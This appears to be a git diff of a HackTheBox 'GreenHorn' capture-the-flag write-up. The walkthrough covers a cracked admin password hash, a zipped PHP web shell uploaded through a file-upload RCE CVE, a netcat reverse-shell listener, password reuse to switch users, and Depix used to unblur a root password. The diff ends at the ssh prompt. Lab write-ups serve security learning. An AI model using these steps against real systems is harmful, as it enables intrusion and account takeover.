@@ -136,31 +136,35 @@ Nmap done: 2 IP addresses (1 host up) scanned in 39.81 seconds
 ```
 
 Navigating to the web server running on port 80 we get this 
-![[web-server.png]]
+![/assets/img/web-server.png]]
 - Let take a look at the admin page 
-![[admin.png]]
+![[/assets/img/admin.png]]
 hmmm let do some enumeration on port 3000 
 Looking at port 3000 we can see that it is running a self hosted git hub repository taking a look at the repository that is running on port 80 we can see there is a file called pass.php we can see that it contains  a password for the admin page 
 `d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'` and cracking it will give us this password `iloveyou1`.
 ## Exploitation 
 
-![[repo_hash.png]]
+![[/assets/img/repo_hash.png]]
 To get a foothold we will use the [CVE](https://vulners.com/packetstorm/PACKETSTORM:173640)  a file upload chained with RCE.
 Preparing the payload:
 
-```bash
+```sh
 [malisio@th3g3ntt1m3n exp]$: zip shell.zip shell.php
 ```
+
 Go to options -> manage modules and upload it, it would be in 
 ```txt
 http://greenhorn.htb/data/modules/shell/shell.php
 ```
+
 Start a listener and u will get a reverse shell: 
 ```sh
 rlwrap -cAr nc -lvnp 9999
 ```
+
 ## Prev esc 
 - The user that runs the server (junior) also uses the same password for his account so we can switch to his user.
+
 ```sh
 www-data@greenhorn:/$ su junior
 Password: iloveyou1
@@ -172,16 +176,18 @@ junior@greenhorn:~$
 junior@greenhorn:~$ls
 'Using OpenVAS.pdf' user.txt
 ```
+
 - Getting root
 Let take a look at the pdf 
 
-![[pdf_overview.png]]
+![[/assets/img/pdf_overview.png]]
 Only if we can unblur the password right? Guess what we can do it using this [tool](clone https://github.com/spipm/Depix)
 convert the pdf file to an image
 ```sh
 python3 depix.py -p org_file.jpg -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
 ```
 and with the unblurred img u can ssh into root
+
 ```sh
 ssh root@greenhorn.htb
 root@greenhorn.htb's password: 
